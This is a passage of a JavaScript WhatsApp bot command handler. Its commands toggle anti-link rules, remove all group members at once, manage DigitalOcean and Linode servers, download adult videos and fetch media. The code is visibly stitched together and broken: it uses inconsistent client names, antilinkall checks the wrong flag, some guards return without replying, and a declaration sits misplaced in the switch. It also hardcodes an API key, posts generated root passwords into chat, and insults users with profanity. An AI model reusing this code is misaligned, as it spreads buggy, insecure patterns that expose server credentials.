  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Owner & Group Admin only`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply('Success in turning on twitter antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return reply('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break  
   case 'antilinkall': {
if (!isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`The bot must be an admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Specifically my admin & owner`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply('Success in turning on all antilink in this group')
var groupe = await ptz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break        
  
 


      
     

        
       case 'kickall': {
if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
const users = participants.map(a => a.id)
await ptz.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}
break
          

	
      case 'promote': case 'admin': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
        ptz.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "promoted successfully")
        await ptz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'demote': case 'unadmin': {
      
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
        ptz.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "demoted successfully")
        await ptz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'add': {
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isCreator) return reply('For My Owner Only')
        ptz.sendMessage(from, { react: { text: "🫡", key: m.key } })


        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        if (users.length == 0) return reply(`Please write the number of the person you want to add to thhis group`)
        await ptz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(`User Added Successfully!`)).catch((err) => reply(`Cannot add that user to this group!`))
      }
        break;  
  

// DO
case "sisadroplet":{
if (!isCreator) return reply(`What are you doing, you stupid orphan?`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Failed to get DigitalOcean account or droplet data.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Who Are You, Im a Dog');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Remainder Droplet You Can Use: ${dropletInfo.remainingDroplets}*

*Total Droplets Used: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`There is an error: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Failed melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('An error occurred while performing restart VPS:', error.message);
      reply('An error occurred while performing restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS Succeed dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) currently dimatikan...');
      } else {
        reply('Failed mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('An error occurred saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) currently dihidupkan...');
      } else {
        reply('Failed menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('An error occurred saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS Succeed dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS seAlready rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'There isnt any IP';

          const textvps = `*VPS Success REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 ptz.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Failed Get informasi VPS seAlready rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Failed melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('An error occurred while performing rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet Succeed deleted.');
      } else {
        const errorData = await response.json();
        throw new Error(`Failed deleting droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('An error occurred while deleting the droplet:', error);
      reply('Occur error while deleting droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("You are not the owner");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'There isnt any Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'There isnt any IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      ptz.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('An error occurred while retrieving droplet data: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Why? It's very good`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet not yet given.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'There isnt any IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Failed memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('An error occurred while checking detail droplet:', error.message);
      throw new Error('An error occurred while checking detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      ptz.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      ptz.sendMessage(m.chat, { text: 'An error occurred while checking detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
  if (!isCreator) return reply(`Sorry, this command is specifically for WhatsApp Bot Developers`);
    let hostname = args[0];
  if (!hostname) return reply('Input Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai made
      reply(`Wait a Moment...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "There isnt any alamat IP yang tersedia";

      let messageText = `VPS Succeed made!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Failed membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`An error occurred saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isCreator) return reply(`Sorry, this command is specifically for WhatsApp Bot Developers`);
    let hostname = args[0];
  if (!hostname) return reply('Input Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai made
      reply(`Wait a Moment...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "There isnt any alamat IP yang tersedia";

      let messageText = `VPS Succeed made!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Failed membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`An error occurred saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isCreator) return reply(`Sorry, this command is specifically for WhatsApp Bot Developers`);
    let hostname = args[0];
  if (!hostname) return reply('Input Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai made
      reply(`Wait a Moment...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "There isnt any alamat IP yang tersedia";

      let messageText = `VPS Succeed made!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Failed membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`An error occurred saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isCreator) return reply(`Sorry, this command is specifically for WhatsApp Bot Developers`);
    let hostname = args[0];
  if (!hostname) return reply('Input Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai made
      reply(`Wait a Moment...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "There isnt any alamat IP yang tersedia";

      let messageText = `VPS Succeed made!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Failed membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`An error occurred saat membuat VPS: ${err}`);
  }}
break    



const dailyTasks = [
    "Take a 5-minute walk.",
    "Drink 2 liters of water.",
    "Spend 10 minutes meditating.",
    "Read 10 pages of a book.",
    "Complete a short workout.",
    "Organize your workspace.",
    "Write down three things you’re grateful for."
];

case 'dailytasks':
    const shuffledTasks = dailyTasks.sort(() => 0.5 - Math.random()).slice(0, 3);  // Pick 3 random tasks
    let taskMessage = '📝 Here are your tasks for today:\n\n';
    shuffledTasks.forEach((task, index) => taskMessage += `${index + 1}. ${task}\n`);
    reply(taskMessage);
    break;
 
case 'removebg':
  if (!quoted) return m.reply(`*Example :*\n> *Reply A Photo With Caption .removebg*`)
  if (!/image/.test(mime)) return reply(`*Example :*\n> *Reply A Photo With Caption .removebg*`)
  if (/image/.test(mime)) {
reply('`Processing`') 
  let mee = await ptz.downloadAndSaveMediaMessage(quoted)
  let mem = await shannzCdn(mee)
  let url = mem.result.url;
  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=gojou&url=${url}`)).json()
  let bg = shannz.result.image
  ptz.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break




case 'opengroup': 
case 'buka': {
if (!m.isGroup) return (`For Group Only`) 
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`) 
ptz.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Done`)
}
break

case 'close': 
case 'closegroup': {
if (!m.isGroup) return (`For Group Only`) 
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`) 
ptz.groupSettingUpdate(m.chat, 'announcement')
reply(`Done`)
}
break    
     
            

  
  


 case 'xnxxdl':{
 

if (!text) return reply(`Where Is the link?\nExample: *.xnxxvideo https://www.xnxx.com/xxxxxxxxxxx*`) 
  reply('`Downloading...`')
  
  try {
    let res = await fetch(`https://api.agatz.xyz/api/xnxxdown?url=${encodeURIComponent(text)}`)
    let json = await res.json()
    
    if (json.status !== 200 || !json.data.status) return reply('Failed to fetch data from API') 

    let videoUrl = json.data.files.high || json.data.files.low || json.data.files.HLS
    let caption = `Title: ${json.data.title}\nDuration: ${json.data.duration}\nInfo: ${json.data.info}`
    let thumbnailUrl = json.data.image

    await ptz.sendMessage(m.chat, { 
      video: { url: videoUrl }, 
      caption: caption 
    }, { quoted: m })
    
  } catch (e) {
    reply(`An Error Occurred, Unable to Retrieve Data From the Url/Link You Entered`)
  }
}
break  


case 'amazon':
  if (!text) return reply('Enter the product you want to search for')
  let p = await (await fetch('https://endpoint.web.id/search/amazon?key=gojou&query=' + text)).json()
  let u = p.result
  let firstImageUrl = u[0].imageUrl
  let caption = u.map(item => 
    `Rating: ${item.rating}\n` +
    `Title: ${item.title}\n` +
    `Price: $${item.price}\n` +
    `Product URL: ${item.productUrl}`
  ).join('\n\n')
  ptz.sendMessage(m.chat, { image: { url: firstImageUrl }, caption: caption }, { quoted: m })
break



case'xnxx': case 'xnxxsearch': {
 if (!isCreator) return reply(`For My Owner Only`) 
 if (m.isGroup) return warning("For Private Chat only")
 if (!text) return reply (`*Example :* ${command} stepmoms`)
 reply('`searching...`')
  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`)
  let res = await response.json()

  if (res.status !== 200) throw `API Error: ${res.creator}`

  let resultText = ''
  for (let i = 0; i < res.data.result.length; i++) {
    let result = res.data.result[i]
    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`
    resultText += hasil + '\n'
  }
reply(resultText)
}
break 

case 'facebook': case 'fb': case 'fbdl':    
  if (!text) return reply('please give me a facebook url or video link');
  await ptz.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}})
await ptz.sendMessage(m?.chat, {react: {text: `📥`,key: m?.key,}}) 
  try {
    let fb00 = await (await fetch('https://endpoint.web.id/downloader/facebook?key=gojou&url=' + text)).json();
    let shannz = fb00.result[0];
await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}}) 
    await ptz.sendMessage(m.chat, { video: { url: shannz.downloadLink }, caption: `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™*` },{ quoted: m });
} catch (e) {
    return reply('Oops, An Error Occured.');
}
break

  case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await await loading()
                let media = await ptz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ptz.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await loading() 
                let media = await ptz.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ptz.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media);

            }
            break
        
case "resetpassword": {
  if (!isCreator) return reply(`Sorry, this command is specifically for WhatsApp Bot Developers`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Password must have at least 8 characters");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Linode VPS Password ID ${linodeId} Succeed direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Failed to reset Linode VPS password: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`An error occurred while resetting the Linode VPS password: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`An error occurred while resetting the Linode VPS password: ${err}`);
  }
}
break;





case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await loading()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
